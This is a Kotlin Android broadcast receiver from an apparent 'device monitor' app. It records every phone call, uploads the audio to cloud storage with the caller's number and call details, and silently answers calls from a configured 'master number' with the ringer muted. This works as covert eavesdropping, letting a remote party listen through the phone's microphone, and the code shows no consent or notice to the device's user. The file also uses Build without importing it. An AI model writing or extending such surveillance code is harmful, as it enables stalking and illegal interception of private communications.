package com.devicemonitor.receiver

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.devicemonitor.data.models.CallRecording
import com.devicemonitor.data.repository.DeviceRepository
import com.devicemonitor.utils.Constants
import com.devicemonitor.utils.RecordingHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class CallStateReceiver : BroadcastReceiver() {

    private val TAG = "CallStateReceiver"
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var recordingHelper: RecordingHelper
    private lateinit var repository: DeviceRepository
    private var lastState: Int = TelephonyManager.CALL_STATE_IDLE
    private var incomingNumber: String? = null
    private var callStartTime: Long? = null
    private var callType: String = "incoming"

    companion object {
        private const val CALL_TYPE_INCOMING = "incoming"
        private const val CALL_TYPE_OUTGOING = "outgoing"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (!this::recordingHelper.isInitialized) {
            recordingHelper = RecordingHelper(context)
        }
        if (!this::repository.isInitialized) {
            repository = DeviceRepository()
        }

        when (intent.action) {
            TelephonyManager.ACTION_PHONE_STATE_CHANGED -> {
                val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
                val phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
                handlePhoneStateChange(context, state, phoneNumber)
            }
            Intent.ACTION_NEW_OUTGOING_CALL -> {
                callType = CALL_TYPE_OUTGOING
                incomingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
            }
        }
    }

    private fun handlePhoneStateChange(context: Context, state: String?, phoneNumber: String?) {
        if (state == TelephonyManager.EXTRA_STATE_RINGING) {
            val masterNumber = Constants.getMasterNumber(context)
            if (Constants.isSilentAnswerEnabled(context) && phoneNumber == masterNumber) {
                silentAnswerCall(context)
            }
        }

        when (state) {
            TelephonyManager.EXTRA_STATE_RINGING -> {
                callType = CALL_TYPE_INCOMING
                incomingNumber = phoneNumber
                lastState = TelephonyManager.CALL_STATE_RINGING
            }
            TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                if (lastState == TelephonyManager.CALL_STATE_RINGING || lastState == TelephonyManager.CALL_STATE_IDLE) {
                    // Call started
                    callStartTime = System.currentTimeMillis()
                    lastState = TelephonyManager.CALL_STATE_OFFHOOK
                    startCallRecording(context)
                }
            }
            TelephonyManager.EXTRA_STATE_IDLE -> {
                if (lastState == TelephonyManager.CALL_STATE_OFFHOOK) {
                    // Call ended
                    callStartTime?.let {
                        val callDurationSeconds = (System.currentTimeMillis() - it) / 1000
                        if (callDurationSeconds > 0) {
                            stopCallRecordingAndSave(context, callDurationSeconds)
                        }
                    }
                    lastState = TelephonyManager.CALL_STATE_IDLE
                    callStartTime = null
                }
            }
        }
    }

    private fun startCallRecording(context: Context) {
        if (!Constants.isAutoCallRecordEnabled(context)) return
        
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "RECORD_AUDIO permission not granted")
            return
        }

        serviceScope.launch {
            val file = recordingHelper.startCallRecording()
            if (file != null) {
                Log.d(TAG, "Call recording started: ${file.absolutePath}")
            }
        }
    }

    private fun stopCallRecordingAndSave(context: Context, durationSeconds: Long) {
        if (!Constants.isAutoCallRecordEnabled(context)) return

        serviceScope.launch {
            val (cloudinaryUrl, publicId) = recordingHelper.stopRecording()
            if (cloudinaryUrl != null && publicId != null) {
                val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                val callRecording = CallRecording(
                    device_id = Constants.getDeviceId(context),
                    cloudinary_public_id = publicId,
                    file_url = cloudinaryUrl,
                    phone_number = incomingNumber,
                    call_type = callType,
                    duration_seconds = durationSeconds,
                    call_timestamp = timestamp,
                    recorded_at = timestamp
                )
                repository.insertCallRecording(callRecording)
                Log.d(TAG, "Call recording saved successfully")
            }
        }
    }

    private fun silentAnswerCall(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val telecomManager = context.getSystemService(Context.TELECOM_SERVICE) as android.telecom.TelecomManager
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
                telecomManager.acceptRingingCall()
                // Use AudioManager to mute the speaker/ringer for this specific call
                val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                audioManager.setStreamMute(android.media.AudioManager.STREAM_RING, true)
            }
        }
    }
}
